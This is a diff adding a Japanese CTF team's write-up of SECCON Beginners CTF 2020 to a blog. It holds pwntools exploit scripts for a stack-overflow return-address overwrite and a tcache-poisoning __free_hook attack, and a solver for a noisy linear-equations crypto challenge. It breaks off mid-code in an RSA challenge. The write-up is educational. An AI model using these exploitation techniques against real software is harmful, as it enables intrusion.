@@ -59,6 +59,608 @@
             
             <div class="posts">
                 
+                <h1 class="content-subhead">24 May 2020, 23:27</h1>
+                <section class="post">
+                    <header class="post-header">
+
+                        <a href="//blog.urandom.team/post/seccon-beginners-ctf-2020/" class="post-title">SECCON Beginners CTF 2020 Write-up</a>
+
+                        <p class="post-meta">
+                            
+                                By <strong class="post-author">mayth</strong>
+                            
+                            
+                                under 
+                                
+                                    <a class="post-category post-category-Write-ups" href='//blog.urandom.team/categories/Write-ups'>Write-ups</a>
+                                
+                            
+                        </p>
+                    </header>
+
+                    <div class="post-description">
+                        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+<p>2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催された<a href="https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html">SECCON Beginners CTF 2020</a>のwrite-upです。</p>
+<p>なお、今回は以下のメンバー編成で参加しました。</p>
+<ul>
+<li>yuscarlet</li>
+<li>mayth</li>
+<li>yyu</li>
+<li>favcastle</li>
+</ul>
+<h2 id="pwn">Pwn</h2>
+<h3 id="beginners-stack">Beginner&rsquo;s Stack</h3>
+<blockquote>
+<p>Let&rsquo;s learn how to abuse stack overflow!</p>
+</blockquote>
+<p>64bit ELFのバイナリが与えられる。これがサーバーで動いている。</p>
+<p>実行すると</p>
+<blockquote>
+<pre><code>Your goal is to call `win` function (located at 0x400861)
+
+   [ Address ]           [ Stack ]
+                   +--------------------+
+0x00007ffeb1443ac0 | 0x00007f30a003dfc8 | &lt;-- buf
+                   +--------------------+
+0x00007ffeb1443ac8 | 0x0000000000400ad0 |
+                   +--------------------+
+0x00007ffeb1443ad0 | 0x0000000000400ad0 |
+                   +--------------------+
+0x00007ffeb1443ad8 | 0x00007f30a0078190 |
+                   +--------------------+
+0x00007ffeb1443ae0 | 0x00007ffeb1443af0 | &lt;-- saved rbp (vuln)
+                   +--------------------+
+0x00007ffeb1443ae8 | 0x000000000040084e | &lt;-- return address (vuln)
+                   +--------------------+
+0x00007ffeb1443af0 | 0x0000000000000000 | &lt;-- saved rbp (main)
+                   +--------------------+
+0x00007ffeb1443af8 | 0x00007f309fe740b3 | &lt;-- return address (main)
+                   +--------------------+
+0x00007ffeb1443b00 | 0x0000000100000001 |
+                   +--------------------+
+0x00007ffeb1443b08 | 0x00007ffeb1443be8 |
+                   +--------------------+
+</code></pre></blockquote>
+<p>といった感じに目標と現時点のスタックフレームが示される親切設計となっている。ついでに目的の<code>win</code>関数では、<code>system(&quot;/bin/sh&quot;)</code>を呼び出してくれる。つまり<code>win</code>関数を呼べれば自動的にシェルが取れる。</p>
+<p>さて、IDAで実行ファイルを見てみると、<code>vuln</code>という関数で入力を受け付けて<code>buf</code>に格納していることがわかる。このとき、<code>buf</code>は<code>0x20</code>(32)byteしかない一方で、<code>read</code>関数を呼ぶときに入力サイズを<code>0x200</code>に設定していて、ここでスタックオーバーフローが発生する。これを使って&quot;return address (vuln)&ldquo;となっている箇所を書き換えればよい。飛び先となる<code>win</code>関数のアドレスは分かっているし、&ldquo;return address&quot;までの長さも分かっているので、次のような入力を与える（エンディアンに注意）。</p>
+<pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x61\x08\x40&quot;' | ./chall
+</code></pre><p>これは失敗する。</p>
+<blockquote>
+<pre><code>Oops! RSP is misaligned!
+Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
+This instruction fails when RSP is not a multiple of 0x10.
+Find a way to align RSP! You're almost there!
+</code></pre></blockquote>
+<p>というわけで、<code>rsp</code>（スタックポインタ）が<code>0x10</code>の倍数になっていないといけない。スタックポインタは8byteずつ動くので、<code>push</code>/<code>pop</code>が呼び出される回数を1回増やすか減らすかする。</p>
+<p><code>win</code>関数があるという<code>0x400861</code>だが、これは関数の先頭、すなわち<code>push rbp</code>を指している。これによってズレているのだとすれば、この命令を飛ばせばよいはずである。<code>push rbp</code>の直後の<code>0x400862</code>を書き込むようにする。</p>
+<pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x62\x08\x40&quot;' | ./chall
+...
+Congratulations!
+</code></pre><p>祝福されたものの即座に終了してしまう。試しに<code>nc</code>で実際の問題サーバーに投げ込んでも、同様に応答が返ってこなくなる。これで1時間以上は潰していたのだが、神の助言によって<code>strace</code>をしてみると、どうも<code>system(&quot;/bin/sh&quot;)</code>は呼べているがttyが取れなくて死んでいるようだった。</p>
+<p>どうしたものか悩んだところで、そういえばpwntoolsに<code>interactive</code>とかいうメソッド生えてなかったっけ、これでttyの代わりにならんか、と思い出してpwntoolsを使ってみる。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;chall&#39;</span>)
+
+vuln_ret <span style="color:#f92672">=</span> pack(<span style="color:#ae81ff">0x400862</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> vuln_ret)
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグを<code>cat</code>した。</p>
+<h3 id="beginners-heap">Beginner&rsquo;s Heap</h3>
+<p>この問題を解くにあたってはこちらの記事が大変参考になった: <a href="https://furutsuki.hatenablog.com/entry/2019/02/26/112207">t-cache poisoning: FireShell CTF 2019 babyheap - ふるつき</a></p>
+<p>さて、こちらはバイナリがない。<code>nc</code>で問題サーバーに繋ぐとこんな表示が現れる。</p>
+<blockquote>
+<pre><code>Let's learn heap overflow today
+You have a chunk which is vulnerable to Heap Overflow (chunk A)
+
+ A = malloc(0x18);
+
+Also you can allocate and free a chunk which doesn't have overflow (chunk B)
+You have the following important information:
+
+ &lt;__free_hook&gt;: 0x7fe9b33978e8
+ &lt;win&gt;: 0x56491d3be465
+
+Call &lt;win&gt; function and you'll get the flag.
+
+1. read(0, A, 0x80);
+2. B = malloc(0x18); read(0, B, 0x18);
+3. free(B); B = NULL;
+4. Describe heap
+5. Describe tcache (for size 0x20)
+6. Currently available hint
+</code></pre></blockquote>
+<p>この対話環境を操作し、ヒープオーバーフローを使って<code>win</code>関数を呼び出すのが目標となる。なお、<code>__free_hook</code>と<code>win</code>関数のアドレスは毎回変化する（検証のために再実行を繰り返しているため、以下のコンソール出力の例示では<code>__free_hook</code>だとするアドレスが変化しているが、その辺りはよしなに読み替えてほしい）。</p>
+<p><code>A</code>は<code>0x18</code>byteしかない一方で、1の操作で<code>0x80</code>byteまで書くことができる。<code>B</code>にはオーバーフローの脆弱性はないが、2の操作で<code>malloc</code>して書き込み、3の操作で<code>free</code>ができる。残りはヒープ状態の表示、tcacheの状態の表示、そしてヒントの表示である。</p>
+<p>何はともあれヒントを見てみる。</p>
+<blockquote>
+<pre><code>Tcache manages freed chunks in linked lists by size.
+Every list can keep up to 7 chunks.
+A freed chunk linked to tcache has a pointer (fd) to the previously freed chunk.
+Let's check what happens when you overwrite fd by Heap Overflow.
+</code></pre></blockquote>
+<p>まず2でBを<code>malloc</code>して適当な値を書き込み、3で<code>free</code>する。この時点で4/5を実行すると次のような状態であることがわかる。</p>
+<blockquote>
+<pre><code>-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
+ [+] A = 0x558bbf3eb330
+ [+] B = (nil)
+                   +--------------------+
+0x0000558bbf3eb320 | 0x0000000000000000 |
+                   +--------------------+
+0x0000558bbf3eb328 | 0x0000000000000021 |
+                   +--------------------+
+0x0000558bbf3eb330 | 0x0000000000000000 | &lt;-- A
+                   +--------------------+
+0x0000558bbf3eb338 | 0x0000000000000000 |
+                   +--------------------+
+0x0000558bbf3eb340 | 0x0000000000000000 |
+                   +--------------------+
+0x0000558bbf3eb348 | 0x0000000000000021 |
+                   +--------------------+
+0x0000558bbf3eb350 | 0x0000000000000000 |
+                   +--------------------+
+0x0000558bbf3eb358 | 0x0000000000000000 |
+                   +--------------------+
+0x0000558bbf3eb360 | 0x0000000000000000 |
+                   +--------------------+
+0x0000558bbf3eb368 | 0x0000000000020ca1 |
+                   +--------------------+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+</code></pre></blockquote>
+<blockquote>
+<pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
+[    tcache (for 0x20)    ]
+        ||
+        \/
+[ 0x0000558bbf3eb350(rw-) ]
+        ||
+        \/
+[      END OF TCACHE      ]
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</code></pre></blockquote>
+<p>ヒントにあった<code>fd</code>が<code>0x0000558bbf3eb350</code>（元々<code>B</code>があった場所）になっている。
+この状態で<code>malloc</code>を行うと確保されたアドレスとして<code>0x0000558bbf3eb350</code>が返ってくるのだが、ヒープレイアウトを見てわかる通り、この領域は<code>A</code>のヒープオーバーフローによって書き換えられる。とりあえず目標の<code>0x0000558bbf3eb350</code>を<code>__free_hook</code>のアドレスに書き換えてみる。先ほどの教訓を生かして最初からpwntoolsを使うことにした。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> p64(free_hook_addr))
+</code></pre></div><p>これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。</p>
+<blockquote>
+<pre><code>It seems __free_hook is successfully linked to tcache!
+But the chunk size is broken or too big maybe...?
+</code></pre></blockquote>
+<blockquote>
+<pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
+[    tcache (for 0x20)    ]
+        ||
+        \/
+[ 0x0000556bb204b350(rw-) ]
+        ||
+        \/
+[ 0x00007fe2b3efe8e8(rw-) ]
+        ||
+        \/
+[      END OF TCACHE      ]
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</code></pre></blockquote>
+<p><code>fd</code>の直前8byteがチャンクサイズなのだが、先ほどの入力では<code>0x5858585858585858</code>になっている。これを適当に<code>0x20</code>にするとヒントが変わる。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">+</span> p64(free_hook_addr))
+</code></pre></div><blockquote>
+<pre><code>It seems __free_hook is successfully linked to tcache!
+But you can't get __free_hook since you can only malloc/free B.
+What if you change the chunk size to a value other than 0x20...?
+</code></pre></blockquote>
+<p>あまりに大きすぎると先ほどのように壊れていると言われるので、<code>0x30</code>にすると次の段階になった。</p>
+<blockquote>
+<pre><code>It seems __free_hook is successfully linked to tcache!
+And the chunk size is properly forged!
+</code></pre></blockquote>
+<p>ここでもう一度<code>B</code>の<code>malloc</code>と書き込みを行う。ここで書き込む内容はなんでもよい。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>)
+</code></pre></div><p>この段階でのヒントはこんな感じ。</p>
+<blockquote>
+<pre><code>It seems __free_hook is successfully linked to tcache!
+The first link of tcache is __free_hook!
+But B is not empty...
+</code></pre></blockquote>
+<p><code>B</code>を<code>free</code>して空にしてみる。</p>
+<blockquote>
+<pre><code>It seems __free_hook is successfully linked to tcache!
+The first link of tcache is __free_hook!
+Also B is empty! You know what to do, right?
+</code></pre></blockquote>
+<p>ここでtcacheの状態を見てみると、<code>B</code>を<code>free</code>したのにここに追加されておらず、<code>__free_hook</code>のアドレスだけが残っていることがわかる。</p>
+<blockquote>
+<pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
+[    tcache (for 0x20)    ]
+        ||
+        \/
+[ 0x00007fc20362c8e8(rw-) ]
+        ||
+        \/
+[      END OF TCACHE      ]
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</code></pre></blockquote>
+<p>最初のヒントには以下の記載があった。</p>
+<blockquote>
+<pre><code>Tcache manages freed chunks in linked lists by size.
+</code></pre></blockquote>
+<p>また、冒頭に挙げた記事にも次の記載がある。</p>
+<blockquote>
+<p>定数TCACHE_MAX_BINSはデフォルトでは64になっていて、キャッシュされるサイズは0x18, 0x28, 0x38, &hellip;, 0x408バイト以下というように区切られています。</p>
+</blockquote>
+<p>つまり、先ほどチャンクサイズを<code>0x30</code>ということにしたため、今<code>malloc</code>して<code>free</code>した<code>B</code>はtcacheの別のリストに追加された、ということだと思う（たぶん）。</p>
+<p>さて、この状態になると次の<code>malloc</code>では<code>__free_hook</code>のアドレスが返ってくる。<code>__free_hook</code>は<code>free</code>したときに呼び出される関数へのポインタである。したがって、今<code>malloc</code>して返ってきた領域に<code>win</code>関数のアドレスを書き込んで<code>free</code>を呼ぶと、代わりに<code>win</code>関数が呼び出される。最後に出力を表示するのを忘れずに。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+p<span style="color:#f92672">.</span>sendline(pack(win_addr))
+
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+
+log<span style="color:#f92672">.</span>info(p<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#34;ctf4b&#34;</span>))
+</code></pre></div><h2 id="crypto">Crypto</h2>
+<h3 id="rb">R&amp;B</h3>
+<p>先頭の文字を見て、Bならbase64decode、RならROT13decodeを繰り返す。</p>
+<h3 id="noisy-equations">Noisy equations</h3>
+<p>下記のPythonプログラムが動いている。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> getenv
+<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> time
+<span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> getrandbits, seed
+
+
+FLAG <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;FLAG&#34;</span>)<span style="color:#f92672">.</span>encode()
+SEED <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;SEED&#34;</span>)<span style="color:#f92672">.</span>encode()
+
+L <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
+N <span style="color:#f92672">=</span> len(FLAG)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dot</span>(A, B):
+    <span style="color:#66d9ef">assert</span> len(A) <span style="color:#f92672">==</span> len(B)
+    <span style="color:#66d9ef">return</span> sum([a <span style="color:#f92672">*</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(A, B)])
+
+coeffs <span style="color:#f92672">=</span> [[getrandbits(L) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(N)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(N)]
+
+seed(SEED)
+
+answers <span style="color:#f92672">=</span> [dot(coeff, FLAG) <span style="color:#f92672">+</span> getrandbits(L) <span style="color:#66d9ef">for</span> coeff <span style="color:#f92672">in</span> coeffs]
+
+<span style="color:#66d9ef">print</span>(coeffs)
+<span style="color:#66d9ef">print</span>(answers)
+</code></pre></div><p>この変数<code>FLAG</code>の内容を知ることができればOKという問題。
+<code>answers</code>が表示されているが、これには乱数<code>getrandbits(L)</code>が加算されているので、
+2回分のデータを使っていくという方法がある。
+いま1回目の結果得られた<code>coeffs</code>を\(C_1\)、そして2回目を\(C_2\)とすると、
+これらは次のような行列である。</p>
+<p>$$
+\begin{align*}
+C_1 &amp;= \left[
+\begin{array}{cccc}
+c^1_{1,1} &amp; c^1_{1,2} &amp; \dots &amp; c^1_{1,44} \\<br>
+\vdots &amp; \ddots &amp;  &amp; \vdots \\<br>
+\vdots &amp;  &amp; \ddots  &amp; \vdots \\<br>
+c^1_{44,1} &amp; c^1_{44,2} &amp; \dots &amp; c^1{44,44}
+\end{array}
+\right] \\<br>
+\\<br>
+C_2 &amp;= \left[
+\begin{array}{cccc}
+c^2_{1,1} &amp; c^2_{1,2} &amp; \dots &amp; c^2_{1,44} \\<br>
+\vdots &amp; \ddots &amp;  &amp; \vdots \\<br>
+\vdots &amp;  &amp; \ddots  &amp; \vdots \\<br>
+c^2_{44,1} &amp; c^2_{44,2} &amp; \dots &amp; c^2_{44,44}
+\end{array}
+\right]
+\end{align*}
+$$</p>
+<p>そして<code>answer</code>は1回目を\(A_1\)、そして2回目を\(A_2\)とすると次のようになる。</p>
+<p>$$
+\begin{align*}
+A_1 &amp;= \left[
+\begin{array}{c}
+a^1_{1} \\<br>
+\vdots \\<br>
+a^1_{44}
+\end{array}
+\right] \\<br>
+\\<br>
+A_2 &amp;= \left[
+\begin{array}{c}
+a^2_{1} \\<br>
+\vdots \\<br>
+a^2_{44}
+\end{array}
+\right]
+\end{align*}
+$$</p>
+<p>ここで\(a^1_{i} - a^2_{i}\)について考える。求めたい<code>FLAG</code>の1文字目から\(x_1, \dots, x_{44}\)とすると、</p>
+<p>$$
+a^1_{i} = \left(\sum^{44}_{j=1}{C^1_{i,j} \times x_j}\right) + R_i
+$$</p>
+<p>であり、この\(R_i\)は<code>getrandbits(L)</code>だがPythonプログラムを見ると、シードを固定しているため、
+どんな値なのかよく分からないが毎回同じ結果になる。
+したがって、\(a^1_{i} - a^2_{i}\)は次のように\(R_i\)がキャンセルされる。</p>
+<p>$$
+a^1_{i} - a^2_{i} = \left(\sum^{44}_{j=1}{C^1_{i,j} \times x_j}\right) -
+\left(\sum^{44}_{j=1}{C^2_{i,j} \times x_j}\right)
+$$</p>
+<p>したがってこれを行列表現すると</p>
+<p>$$
+\left[
+\begin{array}{c}
+a^1_{1} - a^2_{1} \\<br>
+\vdots \\<br>
+a^1_{44} - a^2_{44}
+\end{array}
+\right] = \left[
+\begin{array}{cccc}
+c^1_{1,1} - c^2_{1,1} &amp; c^1_{1,2} - c^2_{1,2} &amp; \dots &amp; c^1_{1,44} - c^2_{1,44} \\<br>
+\vdots &amp; \ddots &amp;  &amp; \vdots \\<br>
+\vdots &amp;  &amp; \ddots  &amp; \vdots \\<br>
+c^1_{44,1} - c^2_{44,1} &amp; c^1_{44,2} - c^2_{44,2} &amp; \dots &amp; c^1_{44,44} - c^2_{44,44}
+\end{array}
+\right]
+\left[
+\begin{array}{c}
+x_{1} \\<br>
+\vdots \\<br>
+x_{44}
+\end{array}
+\right]
+$$</p>
+<p>したがってあとは\(C_1 - C_2\)の逆行列から<code>FLAG</code>を得られる。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> json
+<span style="color:#f92672">import</span> numpy <span style="color:#f92672">as</span> np
+<span style="color:#f92672">from</span> numpy.linalg <span style="color:#f92672">import</span> inv
+
+stream <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span>)
+
+coeffs1 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(stream<span style="color:#f92672">.</span>readline())
+answer1 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(stream<span style="color:#f92672">.</span>readline())
+
+stream2 <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span>)
+
+coeffs2 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(stream2<span style="color:#f92672">.</span>readline())
+answer2 <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(stream2<span style="color:#f92672">.</span>readline())
+
+coeff_diffs <span style="color:#f92672">=</span>np<span style="color:#f92672">.</span>matrix(
+    [ [ c1 <span style="color:#f92672">-</span> c2 <span style="color:#66d9ef">for</span> (c1, c2) <span style="color:#f92672">in</span> zip(c1s, c2s) ] <span style="color:#66d9ef">for</span> (c1s, c2s) <span style="color:#f92672">in</span> zip(coeffs1, coeffs2)  ],
+    dtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;float&#39;</span>
+)
+
+answer_diffs <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>transpose(
+        np<span style="color:#f92672">.</span>matrix(
+            [ a1 <span style="color:#f92672">-</span> a2 <span style="color:#66d9ef">for</span> (a1, a2) <span style="color:#f92672">in</span> zip(answer1, answer2) ],
+            dtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;float&#39;</span>
+        )
+)
+
+coeff_diffs_inv <span style="color:#f92672">=</span> inv(
+    np<span style="color:#f92672">.</span>matrix(coeff_diffs, dtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;float&#39;</span>)
+)
+flag <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>transpose(np<span style="color:#f92672">.</span>linalg<span style="color:#f92672">.</span>solve(coeff_diffs, answer_diffs))
+
+flag_int <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>around(flag)<span style="color:#f92672">.</span>astype(int)<span style="color:#f92672">.</span>tolist()[<span style="color:#ae81ff">0</span>]
+
+<span style="color:#66d9ef">print</span>(flag)
+
+<span style="color:#66d9ef">print</span>( <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([ chr(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag_int ]) )
+</code></pre></div><h3 id="rsa-calc">RSA Calc</h3>
+<p>下記のようなプログラムが動いている。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> params <span style="color:#f92672">import</span> p, q, flag
+<span style="color:#f92672">import</span> binascii
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> signal
+
+
+N <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q
+e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+d <span style="color:#f92672">=</span> inverse(e, (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">input</span>(prompt<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>):
+    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(prompt)
+    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+    <span style="color:#66d9ef">return</span> sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">menu</span>():
+    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;&#39;&#39;----------
+</span><span style="color:#e6db74">1) Sign
+</span><span style="color:#e6db74">2) Exec
+</span><span style="color:#e6db74">3) Exit
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
+    <span style="color:#66d9ef">try</span>:
+        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
+        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+        <span style="color:#66d9ef">return</span> int(sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip())
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmd_sign</span>():
+    data <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;data&gt; &#39;</span>)
+    <span style="color:#66d9ef">if</span> len(data) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">256</span>:
+        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Too long</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+        <span style="color:#66d9ef">return</span>
+
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;F&#39;</span> <span style="color:#f92672">in</span> data <span style="color:#f92672">or</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1337&#39;</span> <span style="color:#f92672">in</span> data:
+        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+        <span style="color:#66d9ef">return</span>
+
+    signature <span style="color:#f92672">=</span> pow(bytes_to_long(data), d, N)
+    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Signature: {}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(binascii<span style="color:#f92672">.</span>hexlify(long_to_bytes(signature))<span style="color:#f92672">.</span>decode()))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmd_exec</span>():
+    data <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;data&gt; &#39;</span>)
+    signature <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74">&#39;signature&gt; &#39;</span>), <span style="color:#ae81ff">16</span>)
+
+    <span style="color:#66d9ef">if</span> signature <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> signature <span style="color:#f92672">&gt;=</span> N:
+        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Invalid signature</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+        <span style="color:#66d9ef">return</span>
+
+    check <span style="color:#f92672">=</span> long_to_bytes(pow(signature, e, N))
+    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">!=</span> check:
+        sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Invalid signature</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+        <span style="color:#66d9ef">return</span>
+
+    chunks <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
+    stack <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> chunks:
+        <span style="color:#66d9ef">if</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;+&#39;</span>:
+            stack<span style="color:#f92672">.</span>append(stack<span style="color:#f92672">.</span>pop() <span style="color:#f92672">+</span> stack<span style="color:#f92672">.</span>pop())
+        <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-&#39;</span>:
+            stack<span style="color:#f92672">.</span>append(stack<span style="color:#f92672">.</span>pop() <span style="color:#f92672">-</span> stack<span style="color:#f92672">.</span>pop())
+        <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;*&#39;</span>:
+            stack<span style="color:#f92672">.</span>append(stack<span style="color:#f92672">.</span>pop() <span style="color:#f92672">*</span> stack<span style="color:#f92672">.</span>pop())
+        <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/&#39;</span>:
+            stack<span style="color:#f92672">.</span>append(stack<span style="color:#f92672">.</span>pop() <span style="color:#f92672">/</span> stack<span style="color:#f92672">.</span>pop())
+        <span style="color:#66d9ef">elif</span> c <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;F&#39;</span>:
